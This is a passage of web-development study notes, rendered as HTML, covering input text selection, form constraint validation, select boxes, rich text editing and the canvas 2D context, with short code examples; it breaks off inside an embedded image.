<ul><li><code>HTMLInputElement.select()</code></li> <li><code>HTMLInputElement.setSelectionRange(selectionStart: number, selectionEnd: number, selectionDirection?: string)</code> <ul><li>selectionDirection: <code>&quot;forward&quot;</code> or <code>&quot;backward&quot;</code>, or <code>&quot;none&quot;</code></li> <li>IE8 and earlier: use <code>Range</code></li></ul></li> <li>often used with <code>HTMLElement.focus()</code></li> <li>fires <code>select</code> event</li></ul></li> <li>Retrieving Selected Text<div class="language-javascript extra-class"><pre class="language-javascript"><code>textbox<span class="token punctuation">.</span>value<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>textbox<span class="token punctuation">.</span>selectionStart<span class="token punctuation">,</span> textbox<span class="token punctuation">.</span>selectionEnd<span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>selection<span class="token punctuation">.</span><span class="token function">createRange</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">;</span> <span class="token comment">// IE8 and earlier</span>
</code></pre></div><ul><li>alternative: <code>Window.getSelection(): Selection</code></li> <li><code>HTMLInputElement.selectionStart</code> — unsigned long: Returns / Sets the beginning index of the selected text
<ul><li>When there's no selection, this returns the offset of the character immediately following the current text input cursor position</li></ul></li> <li><code>HTMLInputElement.selectionEnd</code> — unsigned long: Returns / Sets the end index of the selected text
<ul><li>When there's no selection, this returns the offset of the character immediately following the current text input cursor position</li></ul></li></ul></li></ul></li> <li><p>Blocking Characters</p> <ul><li><code>keypress</code> event, <code>key</code> property, <code>ctrlKey</code> property</li> <li><code>preventDefault()</code></li> <li><code>RegExp.test()</code></li> <li>clipboard events</li></ul></li> <li><p>Automatic Tab Forward</p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>target<span class="token punctuation">.</span>value<span class="token punctuation">.</span>length <span class="token operator">==</span> target<span class="token punctuation">.</span>maxLength<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> form <span class="token operator">=</span> target<span class="token punctuation">.</span>form<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> len <span class="token operator">=</span> form<span class="token punctuation">.</span>elements<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>form<span class="token punctuation">.</span>elements<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>form<span class="token punctuation">.</span>elements<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                form<span class="token punctuation">.</span>elements<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><ul><li>add listener on <code>keyup</code></li> <li>automatically move the focus to the next field when the current field is complete
<ul><li>especially when entering data whose appropriate length is already known</li></ul></li></ul></li></ol> <h3 id="html5-constraint-validation-api"><a href="#html5-constraint-validation-api" class="header-anchor">#</a> HTML5 Constraint Validation API</h3> <ol><li><p>introduction</p> <ul><li>the ability for browsers to validate data in forms before submitting to the server
<ul><li>This capability enables basic validation even when JavaScript is unavailable or fails to load</li></ul></li></ul></li> <li><p>Required Fields — <code>required</code> attribute</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>username<span class="token punctuation">&quot;</span></span> <span class="token attr-name">required</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><ul><li>Any field marked as <code>required</code> must have a value in order for the form to be submitted</li> <li>applies to <code>&lt;input&gt;</code>, <code>&lt;textarea&gt;</code>, and <code>&lt;select&gt;</code></li></ul></li> <li><p><code>input</code></p> <ul><li>type constraint
<ul><li><code>color</code>, <code>date</code>, <code>email</code>, <code>time</code>, <code>url</code>, etc.</li> <li>numbers-based input: <code>&quot;number&quot;</code>, <code>&quot;range&quot;</code>, <code>&quot;datetime-local&quot;</code>, <code>&quot;date&quot;</code>, <code>&quot;month&quot;</code>, <code>&quot;week&quot;</code>, and <code>&quot;time&quot;</code> <ul><li>attribute <code>min</code>, <code>step</code> and <code>max</code> can be specified</li> <li><code>HTMLInputElement.stepUp(n?: number): void</code></li> <li><code>HTMLInputElement.stepDown(n?: number): void</code></li></ul></li></ul></li> <li><code>pattern</code> attribute<div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>display-name<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>ip-display<span class="token punctuation">&quot;</span></span>
              <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>[A-Za-z\s]+<span class="token punctuation">&quot;</span></span>
              <span class="token attr-name">maxlength</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>5<span class="token punctuation">&quot;</span></span> <span class="token attr-name">minlength</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>2<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Aa<span class="token punctuation">&quot;</span></span> <span class="token attr-name">required</span> <span class="token punctuation">/&gt;</span></span>
</code></pre></div><ul><li>a regular expression with which the input value must match</li></ul></li></ul></li> <li><p>custom validity: <code>\(*field*\).setCustomValidity(error: string): void</code></p> <ul><li>an empty string means the constraint is satisfied</li> <li>and any other string means there is an error and this string is the error message to display</li></ul></li> <li><p>Checking Validity</p> <ul><li>css<div class="language-css extra-class"><pre class="language-css"><code><span class="token selector">input:invalid + span:after</span> <span class="token punctuation">{</span>
    <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">'✖'</span><span class="token punctuation">;</span>
    <span class="token property">color</span><span class="token punctuation">:</span> #f00<span class="token punctuation">;</span>
    <span class="token property">padding-left</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token selector">input:valid + span:after</span> <span class="token punctuation">{</span>
    <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">'✓'</span><span class="token punctuation">;</span>
    <span class="token property">color</span><span class="token punctuation">:</span> #26b72b<span class="token punctuation">;</span>
    <span class="token property">padding-left</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div></li> <li><code>HTMLFormElement.checkValidity(): boolean</code> <ul><li>Returns <code>true</code> if the element's child controls are subject to constraint validation and satisfy those constraints</li> <li>Fires an event named <code>invalid</code> at any control that does not satisfy its constraints
<ul><li>such controls are considered invalid if the event is not canceled</li></ul></li></ul></li> <li><code>HTMLInputElement.validity: ValidityState</code>, <code>HTMLTextAreaElement.validity</code>, <code>HTMLSelectElement.validity</code>...
<ul><li>explain why an element's value fails to validate</li> <li>properties
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/ValidityState#Properties" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><code>ValidityState.valid</code> Read only</li> <li><code>ValidityState.customError</code> Read only
<ul><li>Is a Boolean indicating the element's custom validity message has been set to a non-empty string by calling the element's <code>setCustomValidity()</code> method</li></ul></li></ul></li></ul></li></ul></li> <li><p>Disabling Validation — <code>novalidate</code> attribute</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>post<span class="token punctuation">&quot;</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>signup.php<span class="token punctuation">&quot;</span></span> <span class="token attr-name">novalidate</span> <span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!-- form elements here --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><ul><li>If there are multiple submit buttons in a form, you can specify that the form not validate<div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>post<span class="token punctuation">&quot;</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>foo.php<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!-- form elements here --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Regular Submit<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">formnovalidate</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>btnNoValidate<span class="token punctuation">&quot;</span></span>
<span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Non-validating Submit<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
</code></pre></div></li></ul></li></ol> <h3 id="scripting-select-boxes"><a href="#scripting-select-boxes" class="header-anchor">#</a> Scripting Select Boxes</h3> <ol><li><p>Select Boxes</p> <ul><li><code>&lt;select&gt;</code> and <code>&lt;option&gt;</code></li> <li>interface: <code>HTMLSelectElement</code></li> <li>properties
<ul><li>see before</li> <li><code>HTMLSelectElement.options</code> Read only — An <code>HTMLOptionsCollection</code> representing the set of <code>&lt;option&gt;</code> elements contained by this element</li> <li><code>HTMLSelectElement.selectedOptions</code> Read only — An <code>HTMLCollection</code> representing the set of <code>&lt;option&gt;</code> elements that are selected</li> <li><code>HTMLSelectElement.selectedIndex</code> — A <code>long</code> reflecting the index of the first selected <code>&lt;option&gt;</code> element. The value -1 indicates no element is selected
<ul><li>set it removes all selections and selects just the single option specified</li></ul></li></ul></li> <li>methods
<ul><li>see before</li> <li>bracket notation
<ul><li><code>HTMLSelectElement.add(element, before): void</code> — Adds an element to the collection of option elements for this select element
<ul><li><code>element: HTMLOptionElement | HTMLOptGroupElement</code></li> <li><code>before?: number | HTMLElement</code> <ul><li>where should be inserted before</li> <li><code>null</code> or <code>undefined</code> appends to the end</li></ul></li></ul></li> <li><code>HTMLSelectElement.item()</code> — Gets an item from the options collection for this <code>&lt;select&gt;</code> element</li> <li><code>HTMLSelectElement.namedItem()</code> — Gets the item in the options collection with the specified name. The name string can match either the <code>id</code> or the <code>name</code> attribute of an option node</li> <li><code>HTMLSelectElement.remove(index: number): void</code> — Removes the element at the specified index from the options collection for this select element</li></ul></li></ul></li></ul></li> <li><p><code>HTMLOptionElement</code></p> <ul><li>properties
<ul><li><code>selected</code> Boolean — Indicates whether the option is currently selected.</li> <li><code>defaultSelected</code> Boolean — Contains the initial value of the selected HTML attribute, indicating whether the option is selected by default or not</li> <li><code>index</code> Read only long — The position of the option within the list of <code>options</code> it belongs to, in tree-order. If the option is not part of a list of options, like when it is part of the <code>&lt;datalist&gt;</code> element, the value is 0</li> <li><code>text</code> DOMString — Contains the text content of the element</li></ul></li> <li>constructor: <code>Option(text?: string, value?: string, defaultSelected?: boolean, selected?: boolean)</code></li></ul></li></ol> <h3 id="rich-text-editing"><a href="#rich-text-editing" class="header-anchor">#</a> Rich Text Editing</h3> <ol><li><p>using <code>designMode</code></p> <ul><li><code>Document.designMode</code> <ul><li>controls whether the entire document is editable</li> <li><code>&quot;on&quot;</code> and <code>&quot;off&quot;</code></li></ul></li> <li>The basic technique
<ul><li>embed an <code>iframe</code> containing a blank HTML file in the page</li> <li>Through the <code>designMode</code> property, this blank document can be made editable</li> <li>at which point you’re editing the HTML of the page’s <code>&lt;body&gt;</code> element</li></ul></li> <li>in coordination: <code>document.execCommand()</code>, <code>window.getSelection()</code></li></ul></li> <li><p>Using <code>contenteditable</code></p> <ul><li><code>HTMLElement.contentEditable</code> or HTML attribute <code>contenteditable</code> <ul><li>used to indicate whether or not the element is editable</li> <li><code>&quot;true&quot;</code>, <code>&quot;false&quot;</code>, <code>&quot;inherit&quot;</code></li></ul></li> <li>in coordination: <code>document.execCommand()</code>, <code>window.getSelection()</code></li> <li>example: <a href="https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/Editable_content#Example_A_simple_but_complete_rich_text_editor" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li><p>Rich Text in Forms</p> <ul><li>using an <code>iframe</code> or a <code>contenteditable</code> element instead of a form control, a rich text editor will not be submitted</li> <li>extract the HTML manually and submit
<ul><li>typically done by having a hidden form field that is updated with the HTML from the <code>iframe</code> or the <code>contenteditable</code> element</li></ul></li></ul></li></ol> <h2 id="graphics-with-canvas"><a href="#graphics-with-canvas" class="header-anchor">#</a> Graphics with Canvas</h2> <h3 id="interface"><a href="#interface" class="header-anchor">#</a> Interface</h3> <ol><li><p><code>&lt;canvas&gt;</code></p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>drawing<span class="token punctuation">&quot;</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>200<span class="token punctuation">&quot;</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>200<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>Your browser doesn't support the canvas tag.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><ul><li>The default size of the canvas is 300 px × 150 px (width × height)</li> <li>text is for fallback
<ul><li>will be rendered both on older browsers that don't support canvas and in browsers with JavaScript disabled</li></ul></li> <li>close tag required, unlike <code>&lt;img&gt;</code></li></ul></li> <li><p><code>HTMLCanvasElement</code> methods</p> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLCanvasElement#Methods" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><code>HTMLCanvasElement.getContext(contextId, contextAttributes)</code>: see after</li> <li><code>HTMLCanvasElement.captureStream()</code> experimental — Returns a <code>CanvasCaptureMediaStream</code> that is a real-time video capture of the surface of the canvas</li> <li><code>HTMLCanvasElement.toDataURL(type?: string, args?: number): string</code> <ul><li>type: MIME type image format, defaults to <code>image/png</code></li> <li>args: between 0 and 1 indicating image quality if the requested type is <code>image/jpeg</code> or <code>image/webp</code>, defaults to 0.92</li> <li>Returns a data-URL. The returned image is in a resolution of 96dpi.</li></ul></li> <li><code>HTMLCanvasElement.toBlob(callback, type, args)</code> <ul><li>Creates a <code>Blob</code> object representing the image contained in the canvas; this file may be cached on the disk or stored in memory at the discretion of the user agent</li></ul></li></ul></li> <li><p><code>HTMLCanvasElement.getContext(contextId, contextAttributes)</code></p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">var</span> drawing <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;drawing&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//make sure &lt;canvas&gt; is completely supported</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>drawing<span class="token punctuation">.</span>getContext<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> context <span class="token operator">=</span> drawing<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">&quot;2d&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//more code here</span>
<span class="token punctuation">}</span>
</code></pre></div><ul><li>contextId
<ul><li><code>&quot;2d&quot;</code>, leading to the creation of a <code>CanvasRenderingContext2D</code> object representing a two-dimensional rendering context
<ul><li><code>CanvasRenderingContext2D.canvas</code>: back reference</li></ul></li> <li><code>&quot;webgl&quot;</code> (or <code>&quot;experimental-webgl&quot;</code>) which will create a <code>WebGLRenderingContext</code> object representing a three-dimensional rendering context. This context is only available on browsers that implement WebGL version 1 (OpenGL ES 2.0)
<ul><li>The identifier <code>&quot;experimental-webgl&quot;</code> is used in new implementations of WebGL</li></ul></li> <li><code>&quot;webgl2&quot;</code> which will create a <code>WebGL2RenderingContext</code> object representing a three-dimensional rendering context. This context is only available on browsers that implement WebGL version 2 (OpenGL ES 3.0).</li> <li><code>&quot;bitmaprenderer&quot;</code> which will create an <code>ImageBitmapRenderingContext</code> which only provides functionality to replace the content of the canvas with a given <code>ImageBitmap</code></li> <li>anything else: <code>null</code> is returned</li></ul></li> <li>contextAttributes
<ul><li>2d context attributes:
<ul><li><code>alpha</code>: Boolean that indicates if the canvas contains an alpha channel. If set to <code>false</code>, the browser now knows that the backdrop is always opaque, which can speed up drawing of transparent content and images.</li> <li>vender specific ones</li></ul></li> <li>WebGL context attributes:
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLCanvasElement/getContext#Parameters" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li></ul></li></ul></li></ol> <h3 id="the-2d-context"><a href="#the-2d-context" class="header-anchor">#</a> The 2D Context</h3> <h4 id="basics-and-shape"><a href="#basics-and-shape" class="header-anchor">#</a> Basics and Shape</h4> <ol><li><p>Resources</p> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API#Guides_and_tutorials" target="_blank" rel="noopener noreferrer">Drawing DOM objects into a canvas<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API#Guides_and_tutorials" target="_blank" rel="noopener noreferrer">Libraries<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://simon.html5.org/dump/html5-canvas-cheat-sheet.html" target="_blank" rel="noopener noreferrer">cheat sheet<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li><p>The Grid<br> <img src="data:image/png;base64,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